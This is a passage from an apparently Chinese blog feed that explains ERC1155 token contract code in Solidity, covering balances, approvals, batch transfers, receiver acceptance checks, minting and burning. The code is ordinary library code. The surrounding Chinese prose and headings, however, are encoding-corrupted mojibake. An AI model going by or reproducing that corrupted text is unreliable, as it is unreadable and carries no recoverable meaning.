class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// Mapping from token ID to account balances<br>   mapping(uint256 =&gt; mapping(address =&gt; uint256)) private _balances;<br><br>   // Mapping from account to operator approvals<br>   mapping(address =&gt; mapping(address =&gt; bool)) private _operatorApprovals;<br><br>   // Used as the URI for all token types by relying on ID substitution, e.g. https://token-cdn-domain/&#123;id&#125;.json<br>   string private _uri;<br></code></pre></td></tr></table></figure><h2 id="æ„é€ å‡½æ•°-2"><a href="#æ„é€ å‡½æ•°-2" class="headerlink" title="æ„é€ å‡½æ•°"></a>æ„é€ å‡½æ•°</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;_setURI&#125;.<br> */<br>constructor(string memory uri_) &#123;<br>    _setURI(uri_);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å®ç°æŸ¥è¯¢-1"><a href="#å®ç°æŸ¥è¯¢-1" class="headerlink" title="å®ç°æŸ¥è¯¢"></a>å®ç°æŸ¥è¯¢</h2><p>ä¸ERC721ç±»ä¼¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;IERC165-supportsInterface&#125;.<br> */<br>function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) &#123;<br>    return<br>        interfaceId == type(IERC1155).interfaceId ||<br>        interfaceId == type(IERC1155MetadataURI).interfaceId ||<br>        super.supportsInterface(interfaceId);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ ‡è¯†æ˜¯0xd9b67a26</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/*<br>    bytes4(keccak256(&quot;safeTransferFrom(address,address,uint256,uint256,bytes)&quot;)) ^<br>    bytes4(keccak256(&quot;safeBatchTransferFrom(address,address,uint256[],uint256[],bytes)&quot;)) ^<br>    bytes4(keccak256(&quot;balanceOf(address,uint256)&quot;)) ^<br>    bytes4(keccak256(&quot;balanceOfBatch(address[],uint256[])&quot;)) ^<br>    bytes4(keccak256(&quot;setApprovalForAll(address,bool)&quot;)) ^<br>    bytes4(keccak256(&quot;isApprovedForAll(address,address)&quot;));<br>*/<br>bytes4 constant private INTERFACE_SIGNATURE_ERC1155 = 0xd9b67a26;<br></code></pre></td></tr></table></figure><h2 id="åŸºç¡€æŸ¥è¯¢-1"><a href="#åŸºç¡€æŸ¥è¯¢-1" class="headerlink" title="åŸºç¡€æŸ¥è¯¢"></a>åŸºç¡€æŸ¥è¯¢</h2><p>å…¶ä¸­balanceOfBatchå¯ä»¥å®ç°æ‰¹é‡ï¼Œåœ¨å•æ¬¡è°ƒç”¨ä¸­è·å–å¤šä¸ªä½™é¢ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;IERC1155MetadataURI-uri&#125;.<br> *<br> * This implementation returns the same URI for *all* token types. It relies<br> * on the token type ID substitution mechanism<br> * https://eips.ethereum.org/EIPS/eip-1155#metadata[defined in the EIP].<br> *<br> * Clients calling this function must replace the `\&#123;id\&#125;` substring with the<br> * actual token type ID.<br> */<br>function uri(uint256) public view virtual override returns (string memory) &#123;<br>    return _uri;<br>&#125;<br><br>/**<br> * @dev See &#123;IERC1155-balanceOf&#125;.<br> *<br> * Requirements:<br> *<br> * - `account` cannot be the zero address.<br> */<br>function balanceOf(address account, uint256 id) public view virtual override returns (uint256) &#123;<br>    require(account != address(0), &quot;ERC1155: address zero is not a valid owner&quot;);<br>    return _balances[id][account];<br>&#125;<br><br>/**<br> * @dev See &#123;IERC1155-balanceOfBatch&#125;.<br> *<br> * Requirements:<br> *<br> * - `accounts` and `ids` must have the same length.<br> */<br>function balanceOfBatch(address[] memory accounts, uint256[] memory ids)<br>    public<br>    view<br>    virtual<br>    override<br>    returns (uint256[] memory)<br>&#123;<br>    require(accounts.length == ids.length, &quot;ERC1155: accounts and ids length mismatch&quot;);<br><br>    uint256[] memory batchBalances = new uint256[](accounts.length);<br><br>    for (uint256 i = 0; i &lt; accounts.length; ++i) &#123;<br>        batchBalances[i] = balanceOf(accounts[i], ids[i]);<br>    &#125;<br><br>    return batchBalances;<br>&#125;<br><br>    /**<br>     * @dev See &#123;IERC1155-isApprovedForAll&#125;.<br>     */<br>    function isApprovedForAll(address account, address operator) public view virtual override returns (bool) &#123;<br>        return _operatorApprovals[account][operator];<br>    &#125;<br><br></code></pre></td></tr></table></figure><h2 id="è½¬è´¦é€»è¾‘-2"><a href="#è½¬è´¦é€»è¾‘-2" class="headerlink" title="è½¬è´¦é€»è¾‘"></a>è½¬è´¦é€»è¾‘</h2><p>æˆæƒ</p><p>æ‰¹å‡†æˆæƒä¸ERC-20ç•¥æœ‰ä¸åŒã€‚åœ¨ERC1155ä¸­æ— éœ€è®¾ç½®æˆæƒé‡‘é¢ï¼Œåªéœ€è°ƒç”¨setApprovalForAllå°†æ“ä½œå‘˜è®¾ç½®ä¸ºæ‰¹å‡†æˆ–æœªæ‰¹å‡†å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;IERC1155-setApprovalForAll&#125;.<br> */<br>function setApprovalForAll(address operator, bool approved) public virtual override &#123;<br>    _setApprovalForAll(_msgSender(), operator, approved);<br>&#125;<br></code></pre></td></tr></table></figure><p>è½¬è´¦ï¼Œå¯ä»¥ä½¿ç”¨safeTransferFromå’Œå¯ä»¥æ‰¹é‡çš„safeBatchTransferFrom</p><p>safeBatchTransferFromå®ç°ERC1155ä»£å¸æ‰¹é‡è½¬ç§»ï¼ŒåŒ…æ‹¬åŒè´¨åŒ–ä»£å¸ä»¥åŠéåŒè´¨åŒ–ä»£å¸ã€‚ä¸ERC20ä¸ERC721ç›¸æ¯”ï¼ŒERC1155ä¸­å”¯ä¸€çš„åŒºåˆ«æ˜¯å°†æ•°å€¼ä½œä¸ºæ•°ç»„å‚æ•°è¿›è¡Œä¼ é€’ï¼Œæ­¤å¤–è¿˜ä¼šä¼ é€’æ•°ç»„ idã€‚ä¾‹å¦‚ï¼Œç»™å‡ºids=[3, 6, 13]å’Œvalues=[100, 200, 5]ï¼Œä¼ è¾“ç»“æœå¦‚ä¸‹ï¼š</p><ul><li>å°†id=3çš„100ä¸ªä»£å¸ä»åœ°å€_ fromä¼ è¾“åˆ°åœ°å€_toï¼›</li><li>å°†id=6çš„200ä¸ªä»£å¸ä»åœ°å€_ fromä¼ è¾“åˆ°åœ°å€_toï¼›</li><li>å°†id=13çš„5ä¸ªä»£å¸ä»åœ°å€_ fromè½¬ç§»åˆ°åœ°å€_toã€‚</li></ul><p>ERC1155ä¸­åªæœ‰transferFromï¼Œæ²¡æœ‰transferã€‚è¦æƒ³åƒå¸¸è§„çš„transferä¸€æ ·ä½¿ç”¨å®ƒï¼Œåªéœ€å°†â€fromâ€åœ°å€è®¾ä¸ºè°ƒç”¨è¯¥å‡½æ•°çš„åœ°å€ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;IERC1155-safeTransferFrom&#125;.<br> */<br>function safeTransferFrom(<br>    address from,<br>    address to,<br>    uint256 id,<br>    uint256 amount,<br>    bytes memory data<br>) public virtual override &#123;<br>    require(<br>        from == _msgSender() || isApprovedForAll(from, _msgSender()),<br>        &quot;ERC1155: caller is not token owner nor approved&quot;<br>    );<br>    _safeTransferFrom(from, to, id, amount, data);<br>&#125;<br><br>/**<br> * @dev See &#123;IERC1155-safeBatchTransferFrom&#125;.<br> */<br>function safeBatchTransferFrom(<br>    address from,<br>    address to,<br>    uint256[] memory ids,<br>    uint256[] memory amounts,<br>    bytes memory data<br>) public virtual override &#123;<br>    require(<br>        from == _msgSender() || isApprovedForAll(from, _msgSender()),<br>        &quot;ERC1155: caller is not token owner nor approved&quot;<br>    );<br>    _safeBatchTransferFrom(from, to, ids, amounts, data);<br>&#125;<br><br>/**<br> * @dev Transfers `amount` tokens of token type `id` from `from` to `to`.<br> *<br> * Emits a &#123;TransferSingle&#125; event.<br> *<br> * Requirements:<br> *<br> * - `to` cannot be the zero address.<br> * - `from` must have a balance of tokens of type `id` of at least `amount`.<br> * - If `to` refers to a smart contract, it must implement &#123;IERC1155Receiver-onERC1155Received&#125; and return the<br> * acceptance magic value.<br> */<br>function _safeTransferFrom(<br>    address from,<br>    address to,<br>    uint256 id,<br>    uint256 amount,<br>    bytes memory data<br>) internal virtual &#123;<br>    require(to != address(0), &quot;ERC1155: transfer to the zero address&quot;);<br><br>    address operator = _msgSender();<br>    uint256[] memory ids = _asSingletonArray(id);<br>    uint256[] memory amounts = _asSingletonArray(amount);<br><br>    _beforeTokenTransfer(operator, from, to, ids, amounts, data);<br><br>    uint256 fromBalance = _balances[id][from];<br>    require(fromBalance &gt;= amount, &quot;ERC1155: insufficient balance for transfer&quot;);<br>    unchecked &#123;<br>        _balances[id][from] = fromBalance - amount;<br>    &#125;<br>    _balances[id][to] += amount;<br><br>    emit TransferSingle(operator, from, to, id, amount);<br><br>    _afterTokenTransfer(operator, from, to, ids, amounts, data);<br><br>    _doSafeTransferAcceptanceCheck(operator, from, to, id, amount, data);<br>&#125;<br><br>/**<br> * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of &#123;_safeTransferFrom&#125;.<br> *<br> * Emits a &#123;TransferBatch&#125; event.<br> *<br> * Requirements:<br> *<br> * - If `to` refers to a smart contract, it must implement &#123;IERC1155Receiver-onERC1155BatchReceived&#125; and return the<br> * acceptance magic value.<br> */<br>function _safeBatchTransferFrom(<br>    address from,<br>    address to,<br>    uint256[] memory ids,<br>    uint256[] memory amounts,<br>    bytes memory data<br>) internal virtual &#123;<br>    require(ids.length == amounts.length, &quot;ERC1155: ids and amounts length mismatch&quot;);<br>    require(to != address(0), &quot;ERC1155: transfer to the zero address&quot;);<br><br>    address operator = _msgSender();<br><br>    _beforeTokenTransfer(operator, from, to, ids, amounts, data);<br><br>    for (uint256 i = 0; i &lt; ids.length; ++i) &#123;<br>        uint256 id = ids[i];<br>        uint256 amount = amounts[i];<br><br>        uint256 fromBalance = _balances[id][from];<br>        require(fromBalance &gt;= amount, &quot;ERC1155: insufficient balance for transfer&quot;);<br>        unchecked &#123;<br>            _balances[id][from] = fromBalance - amount;<br>        &#125;<br>        _balances[id][to] += amount;<br>    &#125;<br><br>    emit TransferBatch(operator, from, to, ids, amounts);<br><br>    _afterTokenTransfer(operator, from, to, ids, amounts, data);<br><br>    _doSafeBatchTransferAcceptanceCheck(operator, from, to, ids, amounts, data);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æœ€åä¼šé€šè¿‡emitè§¦å‘äº¤æ˜“ï¼Œç„¶åè°ƒç”¨_doSafeBatchTransferAcceptanceCheckæ¥æ£€æŸ¥äº¤æ˜“æ˜¯å¦å®Œæˆï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šæ ¡éªŒæ¥å—tokençš„åœ°å€æ˜¯å¦æ˜¯ä¸€ä¸ªåˆçº¦åœ°å€ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªåˆçº¦åœ°å€å´æ²¡æœ‰æˆåŠŸæ¥æ”¶tokenåˆ™ä¼šé€šè¿‡revertè¿›è¡Œå›æ»šäº¤æ˜“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function _doSafeTransferAcceptanceCheck(<br>    address operator,<br>    address from,<br>    address to,<br>    uint256 id,<br>    uint256 amount,<br>    bytes memory data<br>) private &#123;<br>    if (to.isContract()) &#123;<br>        try IERC1155Receiver(to).onERC1155Received(operator, from, id, amount, data) returns (bytes4 response) &#123;<br>            if (response != IERC1155Receiver.onERC1155Received.selector) &#123;<br>                revert(&quot;ERC1155: ERC1155Receiver rejected tokens&quot;);<br>            &#125;<br>        &#125; catch Error(string memory reason) &#123;<br>            revert(reason);<br>        &#125; catch &#123;<br>            revert(&quot;ERC1155: transfer to non-ERC1155Receiver implementer&quot;);<br>        &#125;<br>    &#125;<br>&#125;<br><br>function _doSafeBatchTransferAcceptanceCheck(<br>    address operator,<br>    address from,<br>    address to,<br>    uint256[] memory ids,<br>    uint256[] memory amounts,<br>    bytes memory data<br>) private &#123;<br>    if (to.isContract()) &#123;<br>        try IERC1155Receiver(to).onERC1155BatchReceived(operator, from, ids, amounts, data) returns (<br>            bytes4 response<br>        ) &#123;<br>            if (response != IERC1155Receiver.onERC1155BatchReceived.selector) &#123;<br>                revert(&quot;ERC1155: ERC1155Receiver rejected tokens&quot;);<br>            &#125;<br>        &#125; catch Error(string memory reason) &#123;<br>            revert(reason);<br>        &#125; catch &#123;<br>            revert(&quot;ERC1155: transfer to non-ERC1155Receiver implementer&quot;);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="é“¸å¸æ“ä½œ-2"><a href="#é“¸å¸æ“ä½œ-2" class="headerlink" title="é“¸å¸æ“ä½œ"></a>é“¸å¸æ“ä½œ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Creates `amount` tokens of token type `id`, and assigns them to `to`.<br> *<br> * Emits a &#123;TransferSingle&#125; event.<br> *<br> * Requirements:<br> *<br> * - `to` cannot be the zero address.<br> * - If `to` refers to a smart contract, it must implement &#123;IERC1155Receiver-onERC1155Received&#125; and return the<br> * acceptance magic value.<br> */<br>function _mint(<br>    address to,<br>    uint256 id,<br>    uint256 amount,<br>    bytes memory data<br>) internal virtual &#123;<br>    require(to != address(0), &quot;ERC1155: mint to the zero address&quot;);<br><br>    address operator = _msgSender();<br>    uint256[] memory ids = _asSingletonArray(id);<br>    uint256[] memory amounts = _asSingletonArray(amount);<br><br>    _beforeTokenTransfer(operator, address(0), to, ids, amounts, data);<br><br>    _balances[id][to] += amount;<br>    emit TransferSingle(operator, address(0), to, id, amount);<br><br>    _afterTokenTransfer(operator, address(0), to, ids, amounts, data);<br><br>    _doSafeTransferAcceptanceCheck(operator, address(0), to, id, amount, data);<br>&#125;<br><br>/**<br> * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of &#123;_mint&#125;.<br> *<br> * Emits a &#123;TransferBatch&#125; event.<br> *<br> * Requirements:<br> *<br> * - `ids` and `amounts` must have the same length.<br> * - If `to` refers to a smart contract, it must implement &#123;IERC1155Receiver-onERC1155BatchReceived&#125; and return the<br> * acceptance magic value.<br> */<br>function _mintBatch(<br>    address to,<br>    uint256[] memory ids,<br>    uint256[] memory amounts,<br>    bytes memory data<br>) internal virtual &#123;<br>    require(to != address(0), &quot;ERC1155: mint to the zero address&quot;);<br>    require(ids.length == amounts.length, &quot;ERC1155: ids and amounts length mismatch&quot;);<br><br>    address operator = _msgSender();<br><br>    _beforeTokenTransfer(operator, address(0), to, ids, amounts, data);<br><br>    for (uint256 i = 0; i &lt; ids.length; i++) &#123;<br>        _balances[ids[i]][to] += amounts[i];<br>    &#125;<br><br>    emit TransferBatch(operator, address(0), to, ids, amounts);<br><br>    _afterTokenTransfer(operator, address(0), to, ids, amounts, data);<br><br>    _doSafeBatchTransferAcceptanceCheck(operator, address(0), to, ids, amounts, data);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ä»£å¸é”€æ¯-2"><a href="#ä»£å¸é”€æ¯-2" class="headerlink" title="ä»£å¸é”€æ¯"></a>ä»£å¸é”€æ¯</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Destroys `amount` tokens of token type `id` from `from`<br> *<br> * Emits a &#123;TransferSingle&#125; event.<br> *<br> * Requirements:<br> *<br> * - `from` cannot be the zero address.<br> * - `from` must have at least `amount` tokens of token type `id`.<br> */<br>function _burn(<br>    address from,<br>    uint256 id,<br>    uint256 amount<br>) internal virtual &#123;<br>    require(from != address(0), &quot;ERC1155: burn from the zero address&quot;);<br><br>    address operator = _msgSender();<br>    uint256[] memory ids = _asSingletonArray(id);<br>    uint256[] memory amounts = _asSingletonArray(amount);<br><br>    _beforeTokenTransfer(operator, from, address(0), ids, amounts, &quot;&quot;);<br><br>    uint256 fromBalance = _balances[id][from];<br>    require(fromBalance &gt;= amount, &quot;ERC1155: burn amount exceeds balance&quot;);<br>    unchecked &#123;<br>        _balances[id][from] = fromBalance - amount;<br>    &#125;<br><br>    emit TransferSingle(operator, from, address(0), id, amount);<br><br>    _afterTokenTransfer(operator, from, address(0), ids, amounts, &quot;&quot;);<br>&#125;<br><br>/**<br> * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of &#123;_burn&#125;.<br> *<br> * Emits a &#123;TransferBatch&#125; event.<br> *<br> * Requirements:<br> *<br> * - `ids` and `amounts` must have the same length.<br> */<br>function _burnBatch(<br>    address from,<br>    uint256[] memory ids,<br>    uint256[] memory amounts<br>) internal virtual &#123;<br>    require(from != address(0), &quot;ERC1155: burn from the zero address&quot;);<br>    require(ids.length == amounts.length, &quot;ERC1155: ids and amounts length mismatch&quot;);<br><br>    address operator = _msgSender();<br><br>    _beforeTokenTransfer(operator, from, address(0), ids, amounts, &quot;&quot;);<br><br>    for (uint256 i = 0; i &lt; ids.length; i++) &#123;<br>        uint256 id = ids[i];<br>        uint256 amount = amounts[i];<br><br>        uint256 fromBalance = _balances[id][from];<br>        require(fromBalance &gt;= amount, &quot;ERC1155: burn amount exceeds balance&quot;);<br>        unchecked &#123;<br>            _balances[id][from] = fromBalance - amount;<br>        &#125;<br>    &#125;<br><br>    emit TransferBatch(operator, from, address(0), ids, amounts);<br><br>    _afterTokenTransfer(operator, from, address(0), ids, amounts, &quot;&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IERC1155Receiveræ¥å£"><a href="#IERC1155Receiveræ¥å£" class="headerlink" title="IERC1155Receiveræ¥å£"></a>IERC1155Receiveræ¥å£</h2><p>æœ‰äº† EIP-165 çš„æ”¯æŒï¼ŒERC-1155 ä»…éœ€è¦æ”¯æŒæ™ºèƒ½åˆçº¦çš„æ¥æ”¶é’©å­ã€‚é’©å­å‡½æ•°å¿…é¡»è¿”å›ä¸€ä¸ªé¢„å®šä¹‰çš„ 4 å­—èŠ‚ magic å€¼ï¼Œè¯¥å€¼æŒ‡å®šä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bytes4(keccak256(&quot;onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)&quot;))<br></code></pre></td></tr></table></figure><p>å½“æ¥æ”¶åˆçº¦è¿”å›æ­¤å€¼æ—¶ï¼Œå‡å®šåˆçº¦æ¥å—è½¬è´¦å¹¶çŸ¥é“å¦‚ä½•å¤„ç† ERC-1155 ä»£å¸ï¼Œé‚£ä¹ˆåˆçº¦å°±ä¸å†ä¼šå‡ºç°å¡æ­»çš„ä»£å¸äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// ERC-1155<br>function onERC1155BatchReceived(<br>    address _operator,<br>    address _from,<br>    uint256[] calldata _ids,<br>    uint256[] calldata _values,<br>    bytes calldata _data<br>) external returns(bytes4);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Etherum</tag>
      
      <tag>EIP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fabricæµ‹è¯•ç¯å¢ƒçš„æ­å»º</title>
    <link href="/2022/07/10/fabric%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/07/10/fabric%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
    
